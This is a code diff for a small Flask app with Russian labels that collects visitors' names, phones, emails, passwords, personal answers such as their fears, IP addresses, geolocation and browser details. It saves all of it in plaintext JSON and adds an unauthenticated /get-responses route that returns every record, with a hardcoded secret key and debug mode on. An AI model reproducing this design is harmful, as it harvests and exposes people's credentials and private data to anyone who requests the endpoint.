@@ -1,9 +1,24 @@
-from flask import Flask, request, render_template, redirect, url_for, session
+from flask import Flask, request, render_template, redirect, url_for, session, jsonify
 import requests
 import os
+import json
 
 app = Flask(__name__)
 app.secret_key = 'very_secret_key'  # для хранения сессии
+
+RESPONSES_FILE = 'responses.json'
+
+def save_response(data):
+    if os.path.exists(RESPONSES_FILE):
+        with open(RESPONSES_FILE, 'r', encoding='utf-8') as f:
+            responses = json.load(f)
+    else:
+        responses = []
+
+    responses.append(data)
+
+    with open(RESPONSES_FILE, 'w', encoding='utf-8') as f:
+        json.dump(responses, f, ensure_ascii=False, indent=4)
 
 @app.route('/', methods=['GET', 'POST'])
 def index():
@@ -41,15 +56,35 @@ def questions():
             'Страхи': request.form.get('fears'),
         }
 
-        with open('log.txt', 'a', encoding='utf-8') as f:
-            f.write(
-                f"{session['name']} | {session['phone']} | {session['email']} | {session['password']} | "
-                f"{answers} | {ip} | {geo.get('city')} | {geo.get('country_name')} | {ua}\n"
-            )
+        full_data = {
+            'name': session['name'],
+            'phone': session['phone'],
+            'email': session['email'],
+            'password': session['password'],
+            'answers': answers,
+            'ip': ip,
+            'location': {
+                'city': geo.get('city'),
+                'country': geo.get('country_name'),
+            },
+            'user_agent': ua
+        }
+
+        save_response(full_data)
 
         return render_template('success.html', name=session['name'], answers=answers, geo=geo, ip=ip, ua=ua)
 
     return render_template('questions.html')
 
+@app.route('/get-responses')
+def get_responses():
+    if os.path.exists(RESPONSES_FILE):
+        with open(RESPONSES_FILE, 'r', encoding='utf-8') as f:
+            responses = json.load(f)
+        return jsonify(responses)
+    else:
+        return jsonify([])
+
 if __name__ == '__main__':
     app.run(debug=True)
+
